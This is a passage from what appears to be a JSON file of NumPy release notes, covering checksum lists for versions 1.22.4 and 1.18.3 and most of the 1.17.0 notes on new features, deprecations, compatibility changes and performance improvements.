f99778023770c12f896768c90f7712e5  numpy-1.22.4-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    757d68b0cdb4e28ffce8574b6a2f3c5e  numpy-1.22.4-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    50becf2e048e54dc5227dfe8378aae1e  numpy-1.22.4-cp310-cp310-win32.whl\n    79dfdc29a4730e44d6df33dbea5b35b0  numpy-1.22.4-cp310-cp310-win_amd64.whl\n    8fd8f04d71ead55c2773d1b46668ca67  numpy-1.22.4-cp38-cp38-macosx_10_15_x86_64.whl\n    41a7c6240081010824cc0d5c02900fe6  numpy-1.22.4-cp38-cp38-macosx_11_0_arm64.whl\n    6bc066d3f61da3304c82d92f3f900a4f  numpy-1.22.4-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    86d959605c66ccba11c6504f25fff0d7  numpy-1.22.4-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    ae0405894c065349a511e4575b919e2a  numpy-1.22.4-cp38-cp38-win32.whl\n    c9a731d08081396b7a1b66977734d2ac  numpy-1.22.4-cp38-cp38-win_amd64.whl\n    4d9b97d74799e5fc48860f0b4a3b255a  numpy-1.22.4-cp39-cp39-macosx_10_14_x86_64.whl\n    c99fa7e04cb7cc23f1713f2023b4e489  numpy-1.22.4-cp39-cp39-macosx_10_15_x86_64.whl\n    dda3815df12b8a99c6c3069f69997521  numpy-1.22.4-cp39-cp39-macosx_11_0_arm64.whl\n    9b7c5b39d5611d92b66eb545d44b25db  numpy-1.22.4-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    90fc45eaf8b8c4fac3f3ebd105a5a856  numpy-1.22.4-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    9562153d4a83d773c20eb626cbd65cde  numpy-1.22.4-cp39-cp39-win32.whl\n    711b23acce54a18ce74fc80f48f48062  numpy-1.22.4-cp39-cp39-win_amd64.whl\n    ab803b24ea557452e828adba1b986af3  numpy-1.22.4-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    09b3a41ea0b9bc20bd1691cf88f0b0d3  numpy-1.22.4.tar.gz\n    b44849506fbb54cdef9dbb435b2b1987  numpy-1.22.4.zip\n\nSHA256\n------\n::\n\n    ba9ead61dfb5d971d77b6c131a9dbee62294a932bf6a356e48c75ae684e635b3  numpy-1.22.4-cp310-cp310-macosx_10_14_x86_64.whl\n    1ce7ab2053e36c0a71e7a13a7475bd3b1f54750b4b433adc96313e127b870887  numpy-1.22.4-cp310-cp310-macosx_10_15_x86_64.whl\n    7228ad13744f63575b3a972d7ee4fd61815b2879998e70930d4ccf9ec721dce0  numpy-1.22.4-cp310-cp310-macosx_11_0_arm64.whl\n    43a8ca7391b626b4c4fe20aefe79fec683279e31e7c79716863b4b25021e0e74  numpy-1.22.4-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a911e317e8c826ea632205e63ed8507e0dc877dcdc49744584dfc363df9ca08c  numpy-1.22.4-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    9ce7df0abeabe7fbd8ccbf343dc0db72f68549856b863ae3dd580255d009648e  numpy-1.22.4-cp310-cp310-win32.whl\n    3e1ffa4748168e1cc8d3cde93f006fe92b5421396221a02f2274aab6ac83b077  numpy-1.22.4-cp310-cp310-win_amd64.whl\n    59d55e634968b8f77d3fd674a3cf0b96e85147cd6556ec64ade018f27e9479e1  numpy-1.22.4-cp38-cp38-macosx_10_15_x86_64.whl\n    c1d937820db6e43bec43e8d016b9b3165dcb42892ea9f106c70fb13d430ffe72  numpy-1.22.4-cp38-cp38-macosx_11_0_arm64.whl\n    d4c5d5eb2ec8da0b4f50c9a843393971f31f1d60be87e0fb0917a49133d257d6  numpy-1.22.4-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    64f56fc53a2d18b1924abd15745e30d82a5782b2cab3429aceecc6875bd5add0  numpy-1.22.4-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    fb7a980c81dd932381f8228a426df8aeb70d59bbcda2af075b627bbc50207cba  numpy-1.22.4-cp38-cp38-win32.whl\n    e96d7f3096a36c8754207ab89d4b3282ba7b49ea140e4973591852c77d09eb76  numpy-1.22.4-cp38-cp38-win_amd64.whl\n    4c6036521f11a731ce0648f10c18ae66d7143865f19f7299943c985cdc95afb5  numpy-1.22.4-cp39-cp39-macosx_10_14_x86_64.whl\n    b89bf9b94b3d624e7bb480344e91f68c1c6c75f026ed6755955117de00917a7c  numpy-1.22.4-cp39-cp39-macosx_10_15_x86_64.whl\n    2d487e06ecbf1dc2f18e7efce82ded4f705f4bd0cd02677ffccfb39e5c284c7e  numpy-1.22.4-cp39-cp39-macosx_11_0_arm64.whl\n    f3eb268dbd5cfaffd9448113539e44e2dd1c5ca9ce25576f7c04a5453edc26fa  numpy-1.22.4-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    37431a77ceb9307c28382c9773da9f306435135fae6b80b62a11c53cfedd8802  numpy-1.22.4-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    cc7f00008eb7d3f2489fca6f334ec19ca63e31371be28fd5dad955b16ec285bd  numpy-1.22.4-cp39-cp39-win32.whl\n    f0725df166cf4785c0bc4cbfb320203182b1ecd30fee6e541c8752a92df6aa32  numpy-1.22.4-cp39-cp39-win_amd64.whl\n    0791fbd1e43bf74b3502133207e378901272f3c156c4df4954cad833b1380207  numpy-1.22.4-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    b4308198d0e41efaa108e57d69973398439c7299a9d551680cdd603cf6d20709  numpy-1.22.4.tar.gz\n    425b390e4619f58d8526b3dcf656dde069133ae5c240229821f01b5f44ea07af  numpy-1.22.4.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.18.3": "==========================\n\nThis release contains various bug/regression fixes.\n\nThe Python versions supported in this release are 3.5-3.8. Downstream\ndevelopers should use Cython >= 0.29.15 for Python 3.8 support and OpenBLAS >=\n3.7 to avoid errors on the Skylake architecture.\n\n\nHighlights\n==========\n\n* Fix for the `method='eigh'` and `method='cholesky'` methods in\n  `numpy.random.multivariate_normal`. Those were producing samples from the\n  wrong distribution.\n\n\nContributors\n============\n\nA total of 6 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n* Max Balandat +\n* Mibu287 +\n* Pan Jan +\n* Sebastian Berg\n* panpiort8 +\n\n\nPull requests merged\n====================\n\nA total of 5 pull requests were merged for this release.\n\n* `15916 <https://github.com/numpy/numpy/pull/15916>`__: BUG: Fix eigh and cholesky methods of numpy.random.multivariate_normal\n* `15929 <https://github.com/numpy/numpy/pull/15929>`__: BUG,MAINT: Remove incorrect special case in string to number...\n* `15930 <https://github.com/numpy/numpy/pull/15930>`__: BUG: Guarantee array is in valid state after memory error occurs...\n* `15954 <https://github.com/numpy/numpy/pull/15954>`__: BUG: Check that `pvals` is 1D in `_generator.multinomial`.\n* `16017 <https://github.com/numpy/numpy/pull/16017>`__: BUG: Alpha parameter must be 1D in `generator.dirichlet`\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    6582c9a045ba92cb11a7062cfabba898  numpy-1.18.3-cp35-cp35m-macosx_10_9_intel.whl\n    f70d5c8d4f598653ff66f640487481ce  numpy-1.18.3-cp35-cp35m-manylinux1_i686.whl\n    5c0f1a8c94d095efd21ab4b8ffeed921  numpy-1.18.3-cp35-cp35m-manylinux1_x86_64.whl\n    92cab35405fe3042e7aa8504d8669cd0  numpy-1.18.3-cp35-cp35m-win32.whl\n    8769b5434fd08fe67d912077082b91d7  numpy-1.18.3-cp35-cp35m-win_amd64.whl\n    2f1f330199d95bd8e709d0e4a0eec65e  numpy-1.18.3-cp36-cp36m-macosx_10_9_x86_64.whl\n    19892d1f036da55f8841ef121478d554  numpy-1.18.3-cp36-cp36m-manylinux1_i686.whl\n    676c3dd16e9d80271c31ee5f9c3b8f20  numpy-1.18.3-cp36-cp36m-manylinux1_x86_64.whl\n    6484099fdb78f732a758286d2eb87632  numpy-1.18.3-cp36-cp36m-win32.whl\n    7d99a2a4ba819b75347468c8ed5e5a9e  numpy-1.18.3-cp36-cp36m-win_amd64.whl\n    a5672f35136ea83dfa7960859a38d6e9  numpy-1.18.3-cp37-cp37m-macosx_10_9_x86_64.whl\n    5b36aaaeb4203b3d26c5dc801dbc66bd  numpy-1.18.3-cp37-cp37m-manylinux1_i686.whl\n    afc4b2445d447f1a7c338026778bd34e  numpy-1.18.3-cp37-cp37m-manylinux1_x86_64.whl\n    2ebc3ba9945d108df75319c359190516  numpy-1.18.3-cp37-cp37m-win32.whl\n    a78f661b1c7bd153c8399db90fba652c  numpy-1.18.3-cp37-cp37m-win_amd64.whl\n    8f16d580559468b7cf23a71dc9945f39  numpy-1.18.3-cp38-cp38-macosx_10_9_x86_64.whl\n    5ec887ba38cd99775666f3493d82ea7c  numpy-1.18.3-cp38-cp38-manylinux1_i686.whl\n    88ce81bc31dec4c14bf835dc466308ed  numpy-1.18.3-cp38-cp38-manylinux1_x86_64.whl\n    5afe9a5f3c21299da599210ff5b76834  numpy-1.18.3-cp38-cp38-win32.whl\n    205364093300906654debbe3beb13359  numpy-1.18.3-cp38-cp38-win_amd64.whl\n    cd631c761f141d382b4e1b31c8232fc0  numpy-1.18.3.tar.gz\n    91314710fe9d29d80b6ccc9629e4532b  numpy-1.18.3.zip\n\nSHA256\n------\n::\n\n    a6bc9432c2640b008d5f29bad737714eb3e14bb8854878eacf3d7955c4e91c36  numpy-1.18.3-cp35-cp35m-macosx_10_9_intel.whl\n    48e15612a8357393d176638c8f68a19273676877caea983f8baf188bad430379  numpy-1.18.3-cp35-cp35m-manylinux1_i686.whl\n    eb2286249ebfe8fcb5b425e5ec77e4736d53ee56d3ad296f8947f67150f495e3  numpy-1.18.3-cp35-cp35m-manylinux1_x86_64.whl\n    1e37626bcb8895c4b3873fcfd54e9bfc5ffec8d0f525651d6985fcc5c6b6003c  numpy-1.18.3-cp35-cp35m-win32.whl\n    163c78c04f47f26ca1b21068cea25ed7c5ecafe5f5ab2ea4895656a750582b56  numpy-1.18.3-cp35-cp35m-win_amd64.whl\n    3d9e1554cd9b5999070c467b18e5ae3ebd7369f02706a8850816f576a954295f  numpy-1.18.3-cp36-cp36m-macosx_10_9_x86_64.whl\n    40c24960cd5cec55222963f255858a1c47c6fa50a65a5b03fd7de75e3700eaaa  numpy-1.18.3-cp36-cp36m-manylinux1_i686.whl\n    a551d8cc267c634774830086da42e4ba157fa41dd3b93982bc9501b284b0c689  numpy-1.18.3-cp36-cp36m-manylinux1_x86_64.whl\n    0aa2b318cf81eb1693fcfcbb8007e95e231d7e1aa24288137f3b19905736c3ee  numpy-1.18.3-cp36-cp36m-win32.whl\n    a41f303b3f9157a31ce7203e3ca757a0c40c96669e72d9b6ee1bce8507638970  numpy-1.18.3-cp36-cp36m-win_amd64.whl\n    e607b8cdc2ae5d5a63cd1bec30a15b5ed583ac6a39f04b7ba0f03fcfbf29c05b  numpy-1.18.3-cp37-cp37m-macosx_10_9_x86_64.whl\n    fdee7540d12519865b423af411bd60ddb513d2eb2cd921149b732854995bbf8b  numpy-1.18.3-cp37-cp37m-manylinux1_i686.whl\n    6725d2797c65598778409aba8cd67077bb089d5b7d3d87c2719b206dc84ec05e  numpy-1.18.3-cp37-cp37m-manylinux1_x86_64.whl\n    4847f0c993298b82fad809ea2916d857d0073dc17b0510fbbced663b3265929d  numpy-1.18.3-cp37-cp37m-win32.whl\n    46f404314dbec78cb342904f9596f25f9b16e7cf304030f1339e553c8e77f51c  numpy-1.18.3-cp37-cp37m-win_amd64.whl\n    264fd15590b3f02a1fbc095e7e1f37cdac698ff3829e12ffdcffdce3772f9d44  numpy-1.18.3-cp38-cp38-macosx_10_9_x86_64.whl\n    e94a39d5c40fffe7696009dbd11bc14a349b377e03a384ed011e03d698787dd3  numpy-1.18.3-cp38-cp38-manylinux1_i686.whl\n    a4305564e93f5c4584f6758149fd446df39fd1e0a8c89ca0deb3cce56106a027  numpy-1.18.3-cp38-cp38-manylinux1_x86_64.whl\n    99f0ba97e369f02a21bb95faa3a0de55991fd5f0ece2e30a9e2eaebeac238921  numpy-1.18.3-cp38-cp38-win32.whl\n    c60175d011a2e551a2f74c84e21e7c982489b96b6a5e4b030ecdeacf2914da68  numpy-1.18.3-cp38-cp38-win_amd64.whl\n    93ee59ec38f3bf8f9a42d5f4301f60e6825a4a6385a145f70badcd2bf2a11134  numpy-1.18.3.tar.gz\n    e46e2384209c91996d5ec16744234d1c906ab79a701ce1a26155c9ec890b8dc8  numpy-1.18.3.zip\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA256\n\n.. currentmodule:: numpy\n\n==========================\n", "1.17.0": "==========================\n\nThis NumPy release contains a number of new features that should substantially\nimprove its performance and usefulness, see Highlights below for a summary. The\nPython versions supported are 3.5-3.7, note that Python 2.7 has been dropped.\nPython 3.8b2 should work with the released source packages, but there are no\nfuture guarantees.\n\nDownstream developers should use Cython >= 0.29.11 for Python 3.8 support and\nOpenBLAS >= 3.7 (not currently out) to avoid problems on the Skylake\narchitecture. The NumPy wheels on PyPI are built from the OpenBLAS development\nbranch in order to avoid those problems.\n\n\nHighlights\n==========\n\n* A new extensible `random` module along with four selectable `random number\n  generators <random.BitGenerators>` and improved seeding designed for use in parallel\n  processes has been added. The currently available bit generators are `MT19937\n  <random.mt19937.MT19937>`, `PCG64 <random.pcg64.PCG64>`, `Philox\n  <random.philox.Philox>`, and `SFC64 <random.sfc64.SFC64>`. See below under\n  New Features.\n\n* NumPy's `FFT <fft>` implementation was changed from fftpack to pocketfft,\n  resulting in faster, more accurate transforms and better handling of datasets\n  of prime length. See below under Improvements.\n\n* New radix sort and timsort sorting methods. It is currently not possible to\n  choose which will be used. They are hardwired to the datatype and used\n  when either ``stable`` or ``mergesort`` is passed as the method. See below\n  under Improvements.\n\n* Overriding numpy functions is now possible by default,\n  see ``__array_function__`` below.\n\n\nNew functions\n=============\n\n* `numpy.errstate` is now also a function decorator\n\n\nDeprecations\n============\n\n`numpy.polynomial` functions warn when passed ``float`` in place of ``int``\n- ---------------------------------------------------------------------------\nPreviously functions in this module would accept ``float`` values provided they\nwere integral (``1.0``, ``2.0``, etc). For consistency with the rest of numpy,\ndoing so is now deprecated, and in future will raise a ``TypeError``.\n\nSimilarly, passing a float like ``0.5`` in place of an integer will now raise a\n``TypeError`` instead of the previous ``ValueError``.\n\nDeprecate `numpy.distutils.exec_command` and ``temp_file_name``\n- ---------------------------------------------------------------\nThe internal use of these functions has been refactored and there are better\nalternatives. Replace ``exec_command`` with `subprocess.Popen` and\n`temp_file_name <numpy.distutils.exec_command>` with `tempfile.mkstemp`.\n\nWriteable flag of C-API wrapped arrays\n- --------------------------------------\nWhen an array is created from the C-API to wrap a pointer to data, the only\nindication we have of the read-write nature of the data is the ``writeable``\nflag set during creation. It is dangerous to force the flag to writeable.\nIn the future it will not be possible to switch the writeable flag to ``True``\nfrom python.\nThis deprecation should not affect many users since arrays created in such\na manner are very rare in practice and only available through the NumPy C-API.\n\n`numpy.nonzero` should no longer be called on 0d arrays\n- -------------------------------------------------------\nThe behavior of `numpy.nonzero` on 0d arrays was surprising, making uses of it\nalmost always incorrect. If the old behavior was intended, it can be preserved\nwithout a warning by using ``nonzero(atleast_1d(arr))`` instead of\n``nonzero(arr)``.  In a future release, it is most likely this will raise a\n``ValueError``.\n\nWriting to the result of `numpy.broadcast_arrays` will warn\n- -----------------------------------------------------------\n\nCommonly `numpy.broadcast_arrays` returns a writeable array with internal\noverlap, making it unsafe to write to. A future version will set the\n``writeable`` flag to ``False``, and require users to manually set it to\n``True`` if they are sure that is what they want to do. Now writing to it will\nemit a deprecation warning with instructions to set the ``writeable`` flag\n``True``.  Note that if one were to inspect the flag before setting it, one\nwould find it would already be ``True``.  Explicitly setting it, though, as one\nwill need to do in future versions, clears an internal flag that is used to\nproduce the deprecation warning. To help alleviate confusion, an additional\n`FutureWarning` will be emitted when accessing the ``writeable`` flag state to\nclarify the contradiction.\n\nNote that for the C-side buffer protocol such an array will return a\nreadonly buffer immediately unless a writable buffer is requested. If\na writeable buffer is requested a warning will be given. When using\ncython, the ``const`` qualifier should be used with such arrays to avoid\nthe warning (e.g. ``cdef const double[::1] view``).\n\n\nFuture Changes\n==============\n\nShape-1 fields in dtypes won't be collapsed to scalars in a future version\n- --------------------------------------------------------------------------\n\nCurrently, a field specified as ``[(name, dtype, 1)]`` or ``\"1type\"`` is\ninterpreted as a scalar field (i.e., the same as ``[(name, dtype)]`` or\n``[(name, dtype, ()]``). This now raises a FutureWarning; in a future version,\nit will be interpreted as a shape-(1,) field, i.e. the same as ``[(name,\ndtype, (1,))]`` or ``\"(1,)type\"`` (consistently with ``[(name, dtype, n)]``\n/ ``\"ntype\"`` with ``n>1``, which is already equivalent to ``[(name, dtype,\n(n,)]`` / ``\"(n,)type\"``).\n\n\nCompatibility notes\n===================\n\n``float16`` subnormal rounding\n- ------------------------------\nCasting from a different floating point precision to ``float16`` used incorrect\nrounding in some edge cases. This means in rare cases, subnormal results will\nnow be rounded up instead of down, changing the last bit (ULP) of the result.\n\nSigned zero when using divmod\n- -----------------------------\nStarting in version `1.12.0`, numpy incorrectly returned a negatively signed zero\nwhen using the ``divmod`` and ``floor_divide`` functions when the result was\nzero. For example::\n\n   >>> np.zeros(10)//1\n   array([-0., -0., -0., -0., -0., -0., -0., -0., -0., -0.])\n\nWith this release, the result is correctly returned as a positively signed\nzero::\n\n   >>> np.zeros(10)//1\n   array([0., 0., 0., 0., 0., 0., 0., 0., 0., 0.])\n\n``MaskedArray.mask`` now returns a view of the mask, not the mask itself\n- ------------------------------------------------------------------------\nReturning the mask itself was unsafe, as it could be reshaped in place which\nwould violate expectations of the masked array code. The behavior of `mask\n<ma.MaskedArray.mask>` is now consistent with `data <ma.MaskedArray.data>`,\nwhich also returns a view.\n\nThe underlying mask can still be accessed with ``._mask`` if it is needed.\nTests that contain ``assert x.mask is not y.mask`` or similar will need to be\nupdated.\n\nDo not lookup ``__buffer__`` attribute in `numpy.frombuffer`\n- ------------------------------------------------------------\nLooking up ``__buffer__`` attribute in `numpy.frombuffer` was undocumented and\nnon-functional. This code was removed. If needed, use\n``frombuffer(memoryview(obj), ...)`` instead.\n\n``out`` is buffered for memory overlaps in `take`, `choose`, `put`\n- ------------------------------------------------------------------\nIf the out argument to these functions is provided and has memory overlap with\nthe other arguments, it is now buffered to avoid order-dependent behavior.\n\nUnpickling while loading requires explicit opt-in\n- -------------------------------------------------\nThe functions `load`, and ``lib.format.read_array`` take an\n``allow_pickle`` keyword which now defaults to ``False`` in response to\n`CVE-2019-6446 <https://nvd.nist.gov/vuln/detail/CVE-2019-6446>`_.\n\n\n.. currentmodule:: numpy.random.mtrand\n\nPotential changes to the random stream in old random module\n- -----------------------------------------------------------\nDue to bugs in the application of ``log`` to random floating point numbers,\nthe stream may change when sampling from `~RandomState.beta`, `~RandomState.binomial`,\n`~RandomState.laplace`, `~RandomState.logistic`, `~RandomState.logseries` or\n`~RandomState.multinomial` if a ``0`` is generated in the underlying `MT19937\n<~numpy.random.mt11937.MT19937>` random stream.  There is a ``1`` in\n:math:`10^{53}` chance of this occurring, so the probability that the stream\nchanges for any given seed is extremely small. If a ``0`` is encountered in the\nunderlying generator, then the incorrect value produced (either `numpy.inf` or\n`numpy.nan`) is now dropped.\n\n.. currentmodule:: numpy\n\n`i0` now always returns a result with the same shape as the input\n- -----------------------------------------------------------------\nPreviously, the output was squeezed, such that, e.g., input with just a single\nelement would lead to an array scalar being returned, and inputs with shapes\nsuch as ``(10, 1)`` would yield results that would not broadcast against the\ninput.\n\nNote that we generally recommend the SciPy implementation over the numpy one:\nit is a proper ufunc written in C, and more than an order of magnitude faster.\n\n`can_cast` no longer assumes all unsafe casting is allowed\n- ----------------------------------------------------------\nPreviously, `can_cast` returned `True` for almost all inputs for\n``casting='unsafe'``, even for cases where casting was not possible, such as\nfrom a structured dtype to a regular one.  This has been fixed, making it\nmore consistent with actual casting using, e.g., the `.astype <ndarray.astype>`\nmethod.\n\n``ndarray.flags.writeable`` can be switched to true slightly more often\n- -----------------------------------------------------------------------\n\nIn rare cases, it was not possible to switch an array from not writeable\nto writeable, although a base array is writeable. This can happen if an\nintermediate `ndarray.base` object is writeable. Previously, only the deepest\nbase object was considered for this decision. However, in rare cases this\nobject does not have the necessary information. In that case switching to\nwriteable was never allowed. This has now been fixed.\n\n\nC API changes\n=============\n\ndimension or stride input arguments are now passed by ``npy_intp const*``\n- -------------------------------------------------------------------------\nPreviously these function arguments were declared as the more strict\n``npy_intp*``, which prevented the caller passing constant data.\nThis change is backwards compatible, but now allows code like::\n\n    npy_intp const fixed_dims[] = {1, 2, 3};\n    // no longer complains that the const-qualifier is discarded\n    npy_intp size = PyArray_MultiplyList(fixed_dims, 3);\n\n\nNew Features\n============\n\n.. currentmodule:: numpy.random\n\nNew extensible `numpy.random` module with selectable random number generators\n- -----------------------------------------------------------------------------\nA new extensible `numpy.random` module along with four selectable random number\ngenerators and improved seeding designed for use in parallel processes has been\nadded. The currently available :ref:`Bit Generators <bit_generator>` are\n`~mt19937.MT19937`, `~pcg64.PCG64`, `~philox.Philox`, and `~sfc64.SFC64`.\n``PCG64`` is the new default while ``MT19937`` is retained for backwards\ncompatibility. Note that the legacy random module is unchanged and is now\nfrozen, your current results will not change. More information is available in\nthe :ref:`API change description <new-or-different>` and in the `top-level view\n<numpy.random>` documentation.\n\n.. currentmodule:: numpy\n\nlibFLAME\n- --------\nSupport for building NumPy with the libFLAME linear algebra package as the LAPACK,\nimplementation, see\n`libFLAME <https://www.cs.utexas.edu/~flame/web/libFLAME.html>`_ for details.\n\nUser-defined BLAS detection order\n- ---------------------------------\n`distutils` now uses an environment variable, comma-separated and case\ninsensitive, to determine the detection order for BLAS libraries.\nBy default ``NPY_BLAS_ORDER=mkl,blis,openblas,atlas,accelerate,blas``.\nHowever, to force the use of OpenBLAS simply do::\n\n   NPY_BLAS_ORDER=openblas python setup.py build\n\nwhich forces the use of OpenBLAS.\nThis may be helpful for users which have a MKL installation but wishes to try\nout different implementations.\n\nUser-defined LAPACK detection order\n- -----------------------------------\n``numpy.distutils`` now uses an environment variable, comma-separated and case\ninsensitive, to determine the detection order for LAPACK libraries.\nBy default ``NPY_LAPACK_ORDER=mkl,openblas,flame,atlas,accelerate,lapack``.\nHowever, to force the use of OpenBLAS simply do::\n\n   NPY_LAPACK_ORDER=openblas python setup.py build\n\nwhich forces the use of OpenBLAS.\nThis may be helpful for users which have a MKL installation but wishes to try\nout different implementations.\n\n`ufunc.reduce` and related functions now accept a ``where`` mask\n- ----------------------------------------------------------------\n`ufunc.reduce`, `sum`, `prod`, `min`, `max` all\nnow accept a ``where`` keyword argument, which can be used to tell which\nelements to include in the reduction.  For reductions that do not have an\nidentity, it is necessary to also pass in an initial value (e.g.,\n``initial=np.inf`` for `min`).  For instance, the equivalent of\n`nansum` would be ``np.sum(a, where=~np.isnan(a))``.\n\nTimsort and radix sort have replaced mergesort for stable sorting\n- -----------------------------------------------------------------\nBoth radix sort and timsort have been implemented and are now used in place of\nmergesort. Due to the need to maintain backward compatibility, the sorting\n``kind`` options ``\"stable\"`` and ``\"mergesort\"`` have been made aliases of\neach other with the actual sort implementation depending on the array type.\nRadix sort is used for small integer types of 16 bits or less and timsort for\nthe remaining types.  Timsort features improved performace on data containing\nalready or nearly sorted data and performs like mergesort on random data and\nrequires :math:`O(n/2)` working space.  Details of the timsort algorithm can be\nfound at `CPython listsort.txt\n<https://github.com/python/cpython/blob/3.7/Objects/listsort.txt>`_.\n\n`packbits` and `unpackbits` accept an ``order`` keyword\n- -------------------------------------------------------\nThe ``order`` keyword defaults to ``big``, and will order the **bits**\naccordingly. For ``'order=big'`` 3 will become ``[0, 0, 0, 0, 0, 0, 1, 1]``,\nand ``[1, 1, 0, 0, 0, 0, 0, 0]`` for ``order=little``\n\n`unpackbits` now accepts a ``count`` parameter\n- ----------------------------------------------\n``count`` allows subsetting the number of bits that will be unpacked up-front,\nrather than reshaping and subsetting later, making the `packbits` operation\ninvertible, and the unpacking less wasteful. Counts larger than the number of\navailable bits add zero padding. Negative counts trim bits off the end instead\nof counting from the beginning. None counts implement the existing behavior of\nunpacking everything.\n\n`linalg.svd` and `linalg.pinv` can be faster on hermitian inputs\n- ----------------------------------------------------------------\nThese functions now accept a ``hermitian`` argument, matching the one added\nto `linalg.matrix_rank` in 1.14.0.\n\ndivmod operation is now supported for two ``timedelta64`` operands\n- ------------------------------------------------------------------\nThe divmod operator now handles two ``timedelta64`` operands, with\ntype signature ``mm->qm``.\n\n`fromfile` now takes an ``offset`` argument\n- -------------------------------------------\nThis function now takes an ``offset`` keyword argument for binary files,\nwhich specifics the offset (in bytes) from the file's current position.\nDefaults to ``0``.\n\nNew mode \"empty\" for `pad`\n- --------------------------\nThis mode pads an array to a desired shape without initializing the new\nentries.\n\n`empty_like` and related functions now accept a ``shape`` argument\n- ------------------------------------------------------------------\n`empty_like`, `full_like`, `ones_like` and `zeros_like` now accept a ``shape``\nkeyword argument, which can be used to create a new array\nas the prototype, overriding its shape as well. This is particularly useful\nwhen combined with the ``__array_function__`` protocol, allowing the creation\nof new arbitrary-shape arrays from NumPy-like libraries when such an array\nis used as the prototype.\n\nFloating point scalars implement ``as_integer_ratio`` to match the builtin float\n- --------------------------------------------------------------------------------\nThis returns a (numerator, denominator) pair, which can be used to construct a\n`fractions.Fraction`.\n\nStructured ``dtype`` objects can be indexed with multiple fields names\n- ----------------------------------------------------------------------\n``arr.dtype[['a', 'b']]`` now returns a dtype that is equivalent to\n``arr[['a', 'b']].dtype``, for consistency with\n``arr.dtype['a'] == arr['a'].dtype``.\n\nLike the dtype of structured arrays indexed with a list of fields, this dtype\nhas the same ``itemsize`` as the original, but only keeps a subset of the fields.\n\nThis means that ``arr[['a', 'b']]`` and ``arr.view(arr.dtype[['a', 'b']])`` are\nequivalent.\n\n``.npy`` files support unicode field names\n- ------------------------------------------\nA new format version of 3.0 has been introduced, which enables structured types\nwith non-latin1 field names. This is used automatically when needed.\n\n\nImprovements\n============\n\nArray comparison assertions include maximum differences\n- -------------------------------------------------------\nError messages from array comparison tests such as\n`testing.assert_allclose` now include \"max absolute difference\" and\n\"max relative difference,\" in addition to the previous \"mismatch\" percentage.\nThis information makes it easier to update absolute and relative error\ntolerances.\n\nReplacement of the fftpack based `fft` module by the pocketfft library\n- ----------------------------------------------------------------------\nBoth implementations have the same ancestor (Fortran77 FFTPACK by Paul N.\nSwarztrauber), but pocketfft contains additional modifications which improve\nboth accuracy and performance in some circumstances. For FFT lengths containing\nlarge prime factors, pocketfft uses Bluestein's algorithm, which maintains\n:math:`O(N log N)` run time complexity instead of deteriorating towards\n:math:`O(N*N)` for prime lengths. Also, accuracy for real valued FFTs with near\nprime lengths has improved and is on par with complex valued FFTs.\n\nFurther improvements to ``ctypes`` support in `numpy.ctypeslib`\n- ---------------------------------------------------------------\nA new `numpy.ctypeslib.as_ctypes_type` function has been added, which can be\nused to converts a `dtype` into a best-guess `ctypes` type. Thanks to this\nnew function, `numpy.ctypeslib.as_ctypes` now supports a much wider range of\narray types, including structures, booleans, and integers of non-native\nendianness.\n\n`numpy.errstate` is now also a function decorator\n- -------------------------------------------------\nCurrently, if you have a function like::\n\n    def foo():\n        pass\n\nand you want to wrap the whole thing in `errstate`, you have to rewrite it\nlike so::\n\n    def foo():\n        with np.errstate(...):\n            pass\n\nbut with this change, you can do::\n\n    np.errstate(...)\n    def foo():\n        pass\n\nthereby saving a level of indentation\n\n`numpy.exp` and `numpy.log` speed up for float32 implementation\n- ---------------------------------------------------------------\nfloat32 implementation of `exp` and `log` now benefit from AVX2/AVX512\ninstruction set which are detected during runtime. `exp` has a max ulp\nerror of 2.52 and `log` has a max ulp error or 3.83.\n\nImprove performance of `numpy.pad`\n- ----------------------------------\nThe performance of the function has been improved for most cases by filling in\na preallocated array with the desired padded shape instead of using\nconcatenation.\n\n`numpy.interp` handles infinities more robustly\n- -----------------------------------------------\nIn some cases where `interp` would previously return `nan`, it now\nreturns an appropriate infinity.\n\nPathlib support for `fromfile`, `tofile` and `ndarray.dump`\n- -----------------------------------------------------------\n`fromfile`, `ndarray.ndarray.tofile` and `ndarray.dump` now support\nthe `pathlib.Path` type for the ``file``/``fid`` parameter.\n\nSpecialized `isnan`, `isinf`, and `isfinite` ufuncs for bool and int types\n- --------------------------------------------------------------------------\nThe boolean and integer types are incapable of storing `nan` and `inf` values,\nwhich allows us to provide specialized ufuncs that are up to 250x faster than\nthe previous approach.\n\n`isfinite` supports ``datetime64`` and ``timedelta64`` types\n- -----------------------------------------------------------------\nPreviously, `isfinite` used to raise a `TypeError` on being used on these\ntwo types.\n\nNew keywords added to `nan_to_num`\n- ----------------------------------\n`nan_to_num` now accepts keywords ``nan``, ``posinf`` and ``neginf``\nallowing the user to define the value to replace the ``nan``, positive and\nnegative ``np.inf`` values respectively.\n\nMemoryErrors caused by allocated overly large arrays are more descriptive\n- -------------------------------------------------------------------------\nOften the cause of a MemoryError is incorrect broadcasting, which results in a\nvery large and incorrect shape. The message of the error now includes this\nshape to help diagnose the cause of failure.\n\n`floor`, `ceil`, and `trunc` now respect builtin magic methods\n- --------------------------------------------------------------\nThese ufuncs now call the ``__floor__``, ``__ceil__``, and ``__trunc__``\nmethods when called on object arrays, making them compatible with\n`decimal.Decimal` and `fractions.Fraction` objects.\n\n`quantile` now works on 